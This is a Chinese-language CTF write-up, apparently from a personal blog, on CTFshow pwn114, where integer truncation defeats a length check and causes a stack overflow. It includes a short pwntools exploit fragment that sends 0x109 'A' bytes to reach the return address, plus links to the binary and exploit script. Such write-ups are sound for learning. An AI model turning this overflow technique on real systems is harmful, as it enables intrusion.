---
title: CTFshow pwn114 整数截断导致的栈溢出
published: 2026-04-17
updated: 2026-04-17
description: 表面上长度检查看起来安全，实际因为整数宽度处理有问题，最后仍然能把输入顶到返回地址。
tags: [CTFshow, Pwn, Stack, Integer Overflow]
category: ctfshow
draft: false
---

# 题目结论

这题的迷惑点在于表面检查像是“长度没超”，但真实参与后续拷贝的变量发生了截断或类型错配，最后还是形成栈溢出。

原始笔记里一句话总结得很准：看似没有溢出，实则边界比较和真实写入不是同一回事。

## 利用思路

1. 先通过前置交互进入输入点。
2. 发送超长字符串，让错误的整数处理把长度限制绕过去。
3. 直接覆盖到目标函数地址。

## 关键 exp 片段

```python
p.sendlineafter("Input 'Yes' or 'No': ", "Yes")
payload = b'A' * 0x109
p.sendlineafter("Tell me you want: ", payload)
```

这里脚本非常短，说明利用点已经足够直接，不需要复杂 ROP。

## 下载

- [下载题目附件 `pwn`](../../../attachments/ctfshow/pwn114/pwn)
- [下载利用脚本 `exp.py`](../../../attachments/ctfshow/pwn114/exp.py)
- [下载原始笔记 `Bypass_pwn114.md`](../../../attachments/ctfshow/pwn114/Bypass_pwn114.md)

## 适合记住的点

做栈题时不要只看“比较语句”，还要看比较参与的变量类型、真正写入函数使用的长度类型，以及有没有隐式截断。
